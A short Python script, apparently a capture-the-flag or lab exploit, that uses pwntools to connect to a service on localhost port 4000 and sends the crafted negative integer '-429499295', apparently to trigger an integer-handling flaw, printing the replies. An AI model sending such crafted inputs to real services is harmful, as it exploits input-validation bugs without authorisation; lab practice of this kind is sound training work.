from pwn import *

r = remote("localhost", 4000)
message = r.recv(4096)
print(message.decode())
r.send(b"-429499295")
message = r.recv(4096)
print(message.decode())
message = r.recv(4096)
print(message.decode())
